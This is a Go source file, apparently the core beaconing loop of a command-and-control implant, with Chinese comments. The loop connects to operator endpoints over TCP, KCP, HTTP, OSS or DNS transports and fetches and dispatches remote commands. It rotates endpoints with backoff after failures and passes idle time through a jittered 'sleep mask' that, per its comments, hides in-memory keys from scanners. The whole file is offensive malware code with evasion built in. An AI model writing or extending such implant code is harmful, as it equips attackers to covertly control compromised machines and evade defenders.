package main

import (
	"implant/core/app"
	"implant/core/debuglog"
	"implant/core/communication"
	"implant/core/config"
	"implant/core/reconnect"
	"math/rand"
	"time"
)

// heartbeatStarter 由需要独立心跳的传输实现（内部管理 ticker，重连时先停旧再起新）
type heartbeatStarter interface {
	StartHeartbeat()
}

// pollTransport 由轮询型传输（HTTP/OSS/DNS）实现：返回轮询间隔；
// 持久传输不实现，空闲时按 WaitTime 抖动休眠
type pollTransport interface {
	PollInterval() time.Duration
}

// transportClient 单二进制对传输的统一视图：Transport 能力 + 连接状态 + 重连管理器
type transportClient interface {
	communication.Transport
	IsConnected() bool
	ReconnectMgr() *reconnect.ReconnectManager
}

// NewTransport 由各 transport 文件实现：构造并返回当前 build tag 对应的传输实例
// （TCP/KCP 等持久传输在 Connect 内完成心跳与密钥设置）。

// runLoop 单二进制共享主循环（原各 adapter 重复的 runLoop 收敛于此）：
// 连接 → 心跳 → 拉取命令 → 派发 → 空闲休眠；失败时指数退避重连并轮转 endpoint。
func runLoop() {
	host := app.CurrentEndpoint()
	client := NewTransport()
	r := rand.New(rand.NewSource(time.Now().UnixNano()))

	recvFailCount := 0
	for {
		if !client.IsConnected() {
			if !client.ReconnectMgr().CanAttemptReconnect() {
				time.Sleep(30 * time.Second)
				continue
			}
			time.Sleep(client.ReconnectMgr().GetNextDelay())
			if err := client.Connect(host); err != nil {
				host = app.AdvanceEndpoint()
				recvFailCount = 0
				debuglog.Printf("❌ [%s] 连接失败: %v\n", listenerType, err)
				continue
			}
			communication.SetTransport(client)
			// 持久传输在 Connect 内已启动心跳；轮询/独立心跳在此兜底启动
			if hs, ok := client.(heartbeatStarter); ok {
				hs.StartHeartbeat()
			}
		}

		data, err := client.Recv()
		if err != nil {
			recvFailCount++
			debuglog.Printf("❌ [%s] 读取失败: %v，将重连 (连续失败 %d 次)\n", listenerType, err, recvFailCount)
			// 通道连续失败（≥3 次）时轮转 endpoint，避免死守坏服务器
			if recvFailCount >= 3 {
				recvFailCount = 0
				host = app.AdvanceEndpoint()
				debuglog.Printf("🔄 [%s] 通道连续失败，切换到下一个 endpoint: %s\n", listenerType, host)
			}
			continue
		}
		recvFailCount = 0

		if data != nil {
			app.HandleCommand(data)
			continue
		}

		// 空闲休眠：轮询型按 PollInterval，持久型按 WaitTime；**两者都走 sleep mask**
		// （原实现持久型走无遮蔽的 SleepWithJitter，而长连接的密钥驻留时间最长）
		if pt, ok := client.(pollTransport); ok {
			interval := pt.PollInterval()
			if interval < 1000*time.Millisecond {
				interval = config.WaitTime // 防御：传输未给有效间隔时回退 sleep 基准
			}
			app.SleepMask(app.Jittered(interval))
		} else {
			app.SleepMaskedWithJitter(r)
		}
	}
}

// 仅用于引用 reconnect 包（各传输的 ReconnectMgr 实现用到）
var _ = reconnect.NewReconnectManager
var _ = config.WaitTime
